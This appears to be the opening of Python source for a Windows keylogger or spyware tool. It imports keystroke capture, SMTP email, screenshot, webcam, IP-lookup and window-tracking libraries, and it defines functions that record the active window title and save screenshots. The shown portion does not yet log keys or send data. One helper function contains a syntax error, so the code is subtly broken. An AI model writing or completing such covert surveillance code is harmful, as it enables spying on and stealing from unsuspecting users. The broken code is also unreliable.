import keyboard
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import socket
from requests import get
import logging
from PIL import ImageGrab
import os
import psutil
import win32gui
from datetime import datetime
from dotenv import load_dotenv
import cv2 




load_dotenv()

active_apps = {}

def get_active_app_name():
    active_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return active_app

def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

def ensure_file_access(path):
    """
    Ensure file exists and is readable. If not present, create an empty file.
    Returns True if file exists and is readable, False otherwise.
    """
    try:
        if not os.path.exists(path)
            open(path, "w").close()
        with open(path, "rb"):
            pass
        return True
    except Exception as e:
        print(f"Warning: cannot access {path}: {e}")
        return False
